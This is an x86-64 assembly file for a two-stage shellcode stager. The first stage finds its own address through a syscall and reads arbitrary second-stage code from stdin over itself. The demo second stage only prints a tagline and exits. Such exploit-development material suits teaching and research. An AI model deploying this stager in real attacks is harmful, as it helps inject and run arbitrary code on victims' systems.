/*

Author: Abhinav Thakur
File:   firststage.s
Compile:        $ gcc -Wl,-N -nostdlib -static firststage.s -o ./firststage.elf
Dump shellcode :$ objcopy --dump-section .text=firststage.raw ./firststage.elf
Run            :$ ./firststage.elf

kernel syscall interface uses the following registers to pass
syscall arguments -> %rdi, %rsi, %rdx, %r10, %r8, %r9

*/

.global _start
_start:
.intel_syntax noprefix

stage1:

		// can get RIP via below methods (but generate NULL bytes)
		// sequence -> call trampoline; jmp getCurrentRIP
		// relative addressing -> lea rsi, [rel getCurrentRIP]
		push 39
		pop rax
		syscall	
	
     	/* 
			Read 2nd stage shellcode in shelter.
			read (0, rcx, 0xffff);
        */
getCurrentRIP:
		push rcx
        pop rsi			/* rsi = &(push rcx) */
        xor edi,  edi	/* rdi = 0 (STDIN_FILENO) */
        push 0xffff	
        pop rdx			/* rdx = 0xffff (bytes to read) */
        xor eax, eax    /* rax = 0 (syscall number) */
        syscall

trampoline:
	pop rsi
	jmp getCurrentRIP

/*
        padding of NOPs depending of how long the first read() is,
        i.e, Xtimes = MAX_BYTES_READ - (current_address-stage1_address)
*/
junk:
.space 45-(junk-stage1), 0x90


stage2:
/* overwrite stage1 body (selectively malicious body) with NOPs */	
.space (junk-stage1), 0x90

		/* Now send stage2 payload in target communication channel */
        /* write (1, "compilepeace was here x_x\n", 26);  */
        xor rdi, rdi
        push rdi				/* push a NULL QUADWORD on stack */
        inc rdi                 /* rdi = 1 (STDOUT_FILENO) */
        mov word ptr [rsp], 0x0a78      /* "\nx" */
        mov rax, 0x5f78206572656820
        push rax                /* " here x_" (in LE byte order) */
        mov rax, 0x7361772065636165
        push rax                /* "eace was" (in LE byte order) */
        mov rax, 0x70656c69706d6f63
        push rax                /* "compilep" (in LE byte order) */
        push rsp
        pop rsi                 /* rsi = rsp (points to -> "com...\n" */
        push 26
        pop rdx                 /* rdx = 26 (msg length) */
        push 1
        pop rax                 /* rax = 1 (syscall number) */
        syscall

        /* exit (7) */
        push 7
        pop rdi                 /* rdi = 7 (exit status) */
        push 60
        pop rax                 /* rax = 60 (syscall number) */
        syscall

		
